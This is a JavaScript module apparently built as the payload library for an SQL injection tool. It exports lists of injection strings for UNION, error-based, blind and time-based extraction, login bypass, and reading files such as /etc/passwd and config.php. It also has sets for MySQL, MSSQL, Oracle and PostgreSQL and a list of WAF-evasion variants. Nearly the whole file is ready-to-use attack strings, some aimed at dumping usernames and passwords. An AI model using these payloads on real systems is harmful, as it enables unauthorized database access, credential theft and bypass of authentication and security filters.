// CHAOS SQL INJECTION PAYLOADS DATABASE

const PAYLOADS = {
    union: [
        "' UNION SELECT 1,2,3-- -",
        "' UNION SELECT NULL,NULL,NULL-- -",
        "' UNION SELECT 1,@@version,3-- -",
        "' UNION SELECT 1,database(),3-- -",
        "' UNION SELECT 1,user(),3-- -",
        "' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -",
        "' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -",
        "' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users-- -",
        "' UNION SELECT 1,load_file('/etc/passwd'),3-- -",
        "' UNION SELECT 1,@@datadir,3-- -",
        "' UNION SELECT 1,concat_ws(0x3a,user(),database(),version()),3-- -",
        "' UNION SELECT 1,table_name,3 FROM information_schema.tables LIMIT 1-- -",
        "' UNION SELECT 1,column_name,3 FROM information_schema.columns LIMIT 1-- -",
        "' UNION SELECT 1,count(*),3 FROM information_schema.tables-- -"
    ],
    
    error: [
        "' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))-- -",
        "' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)-- -",
        "' OR 1=1-- -",
        "' HAVING 1=1-- -",
        "' GROUP BY 1 HAVING 1=1-- -",
        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT user()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
        "' AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables))-- -",
        "' AND 1=CAST((SELECT table_name FROM information_schema.tables) AS INT)-- -",
        "' OR 1=1 LIMIT 1-- -"
    ],
    
    blind: [
        "' AND LENGTH(database())=1-- -",
        "' AND SUBSTRING(database(),1,1)='a'-- -",
        "' AND IF(1=1,SLEEP(5),0)-- -",
        "' AND (SELECT * FROM (SELECT SLEEP(5))a)-- -",
        "' AND 1=1-- -",
        "' AND 1=2-- -",
        "' AND 'a'='a'-- -",
        "' AND 'a'='b'-- -",
        "' AND ASCII(SUBSTRING(database(),1,1))>64-- -",
        "' AND ASCII(SUBSTRING(database(),1,1))<128-- -"
    ],
    
    time: [
        "'; WAITFOR DELAY '0:0:5'-- -",
        "' OR SLEEP(5)-- -",
        "' AND pg_sleep(5)-- -",
        "'; SELECT pg_sleep(5)-- -",
        "' AND 1=(SELECT COUNT(*) FROM pg_sleep(5))-- -",
        "' AND 1=1 AND SLEEP(5)-- -",
        "' OR (SELECT * FROM (SELECT SLEEP(5)) AS delay)-- -",
        "' AND (SELECT COUNT(*) FROM information_schema.tables WHERE SLEEP(5))-- -"
    ],
    
    advanced: [
        "/**/UNION/**/SELECT/**/1,2,3-- -",
        "'/*!50000UNION*/SELECT/**/1,2,3-- -",
        "' UNION/**/SELECT/**/1,2,3-- -",
        "' UniOn SeLeCt 1,2,3-- -",
        "'%55nion%53elect 1,2,3-- -",
        "' UNION SELECT 1,2,3#",
        "' UNION SELECT 1,2,3/*",
        "' UNION SELECT 1,2,3;%00",
        "' UNION SELECT 1,2,3 AND '1'='1",
        "' UNION SELECT 1,2,3 OR '1'='1"
    ],
    
    auth_bypass: [
        "' OR '1'='1'-- -",
        "' OR '1'='1'/*",
        "' OR '1'='1'#",
        "' OR 1=1-- -",
        "' OR 1=1#",
        "' OR 1=1/*",
        "'admin'-- -",
        "'admin' #",
        "'admin'/*",
        "admin' OR '1'='1",
        "admin' OR '1'='1'-- -",
        "admin' OR '1'='1'/*",
        "admin' OR '1'='1'#"
    ],
    
    file_access: [
        "' UNION SELECT 1,load_file('/etc/passwd'),3-- -",
        "' UNION SELECT 1,load_file('C:\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts'),3-- -",
        "' UNION SELECT 1,load_file('/var/www/html/config.php'),3-- -",
        "' AND (SELECT load_file('/etc/passwd'))-- -",
        "' UNION SELECT 1,@@basedir,3-- -",
        "' UNION SELECT 1,@@datadir,3-- -"
    ]
};

// Database specific payloads
const DB_PAYLOADS = {
    mysql: {
        info: [
            "' UNION SELECT 1,@@version,3-- -",
            "' UNION SELECT 1,database(),3-- -",
            "' UNION SELECT 1,user(),3-- -",
            "' UNION SELECT 1,@@datadir,3-- -",
            "' UNION SELECT 1,@@basedir,3-- -",
            "' UNION SELECT 1,@@hostname,3-- -"
        ],
        tables: [
            "' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -",
            "' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database() LIMIT 1-- -"
        ],
        columns: [
            "' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -",
            "' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users' LIMIT 1-- -"
        ]
    },
    
    mssql: {
        info: [
            "' UNION SELECT 1,@@version,3-- -",
            "' UNION SELECT 1,db_name(),3-- -",
            "' UNION SELECT 1,system_user,3-- -",
            "' UNION SELECT 1,user_name(),3-- -",
            "' UNION SELECT 1,host_name(),3-- -"
        ],
        tables: [
            "' UNION SELECT 1,name,3 FROM sysobjects WHERE xtype='U'-- -",
            "' UNION SELECT 1,table_name,3 FROM information_schema.tables-- -"
        ]
    },
    
    oracle: {
        info: [
            "' UNION SELECT 1,version,3 FROM v$instance-- -",
            "' UNION SELECT 1,user,3 FROM dual-- -",
            "' UNION SELECT 1,ora_database_name,3 FROM dual-- -"
        ],
        tables: [
            "' UNION SELECT 1,table_name,3 FROM all_tables WHERE rownum=1-- -",
            "' UNION SELECT 1,table_name,3 FROM user_tables WHERE rownum=1-- -"
        ]
    },
    
    postgresql: {
        info: [
            "' UNION SELECT 1,version(),3-- -",
            "' UNION SELECT 1,current_database(),3-- -",
            "' UNION SELECT 1,current_user,3-- -",
            "' UNION SELECT 1,inet_server_addr(),3-- -"
        ],
        tables: [
            "' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema='public'-- -",
            "' UNION SELECT 1,tablename,3 FROM pg_tables WHERE schemaname='public'-- -"
        ]
    }
};

// WAF bypass payloads
const WAF_BYPASS = [
    "'/**/UNION/**/SELECT/**/1,2,3-- -",
    "'%55nion%53elect 1,2,3-- -",
    "' UniOn SeLeCt 1,2,3-- -",
    "'/*!50000UNION*/SELECT/**/1,2,3-- -",
    "' UNION/**/SELECT/**/1,2,3-- -",
    "'+UNION+SELECT+1,2,3-- -",
    "'%20UNION%20SELECT%201,2,3-- -",
    "' UNION SELECT 1,2,3;%00",
    "' UNION SELECT 1,2,3 AND '1'='1",
    "0x55nion 0x53elect 1,2,3-- -"
];

// Time-based detection queries
const TIME_QUERIES = {
    mysql: [
        "' AND IF(1=1,SLEEP(5),0)-- -",
        "' AND (SELECT * FROM (SELECT SLEEP(5))a)-- -",
        "' AND 1=(SELECT COUNT(*) FROM information_schema.tables WHERE SLEEP(5))-- -"
    ],
    mssql: [
        "'; WAITFOR DELAY '0:0:5'-- -",
        "'; IF(1=1) WAITFOR DELAY '0:0:5'-- -",
        "' AND 1=(SELECT COUNT(*) FROM sys.tables WHERE 1=1 AND 1=1); WAITFOR DELAY '0:0:5'-- -"
    ],
    oracle: [
        "' AND 1=(SELECT COUNT(*) FROM all_tables WHERE (SELECT COUNT(*) FROM all_tables)>0 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',5))-- -",
        "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',5)-- -"
    ],
    postgresql: [
        "' AND (SELECT COUNT(*) FROM pg_sleep(5))>0-- -",
        "' AND 1=(SELECT COUNT(*) FROM pg_sleep(5))-- -"
    ]
};

// Export for use in other files
if (typeof module !== 'undefined' && module.exports) {
    module.exports = { PAYLOADS, DB_PAYLOADS, WAF_BYPASS, TIME_QUERIES };
}
